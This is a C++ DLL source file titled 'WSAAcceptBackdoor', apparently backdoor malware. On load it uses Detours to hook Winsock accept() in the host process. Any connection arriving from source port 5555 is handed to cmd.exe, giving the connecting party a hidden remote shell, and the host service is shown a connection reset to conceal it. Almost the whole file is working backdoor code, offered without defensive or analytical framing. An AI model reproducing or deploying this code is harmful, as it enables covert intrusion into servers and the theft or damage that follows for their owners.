
//  __          _______                                     _   ____             _       _
//  \ \        / / ____|  /\        /\                     | | |  _ \           | |     | |
//   \ \  /\  / / (___   /  \      /  \   ___ ___ ___ _ __ | |_| |_) | __ _  ___| | ____| | ___   ___  _ __
//    \ \/  \/ / \___ \ / /\ \    / /\ \ / __/ __/ _ \ '_ \| __|  _ < / _` |/ __| |/ / _` |/ _ \ / _ \| '__|
//     \  /\  /  ____) / ____ \  / ____ \ (_| (_|  __/ |_) | |_| |_) | (_| | (__|   < (_| | (_) | (_) | |
//      \/  \/  |_____/_/    \_\/_/    \_\___\___\___| .__/ \__|____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|
//                                                   | |  Author: @egeblc
//                                                   |_|

// dllmain.cpp : Defines the entry point for the DLL application.

#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <ws2tcpip.h>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "ncat_exec_win.c"
#include "detours.h"

#pragma comment(lib, "Ws2_32.lib")

#if defined _M_X64
#pragma comment(lib, "detours-x64.lib")
#elif defined _M_IX86
#pragma comment(lib, "detours-x86.lib")
#endif

#define BACKDOOR_PORT 5555

#define bytes_to_u16(MSB, LSB) (((unsigned int)((unsigned char)MSB)) & 255) << 8 | (((unsigned char)LSB) & 255)
SOCKET(WSAAPI *RealWSAAccept)
(SOCKET s, sockaddr *addr, LPINT addrlen, LPCONDITIONPROC lpfnCondition, DWORD_PTR dwCallbackData) = NULL;
SOCKET(WSAAPI *RealAccept)
(SOCKET s, sockaddr *addr, int *addrlen) = NULL;

SOCKET WSAAPI BackdooredAccept(SOCKET s, sockaddr *addr, int *addrlen)
{
	//...
	SOCKET retVal = RealAccept(s, addr, addrlen);
	unsigned int port = bytes_to_u16(addr->sa_data[0], addr->sa_data[1]);
	if (port == BACKDOOR_PORT)
	{
		fdinfo fdn;
		ZeroMemory(&fdn, sizeof(fdn));
		ZeroMemory(&fdn.remoteaddr, sizeof(fdn.remoteaddr));
		fdn.fd = retVal;
		char shell[] = "cmd.exe";
		netrun(&fdn, shell);
		return WSAECONNRESET;
	}

	return retVal;
}

BOOL APIENTRY DllMain(HMODULE hModule,
					  DWORD ul_reason_for_call,
					  LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:

		RealAccept = ((SOCKET(WSAAPI *)(
			SOCKET,
			sockaddr *,
			int *))
						  DetourFindFunction("WS2_32.dll", "accept"));

		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());

		if (DetourAttach(&(PVOID &)RealAccept, BackdooredAccept) != NO_ERROR)
		{
			//printf("[-] accept() detour attach failed!\n");
		}

		if (DetourTransactionCommit() != NO_ERROR)
		{
			//printf("[-] DetourTransactionCommit() failed!\n");
		}
		break;

	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
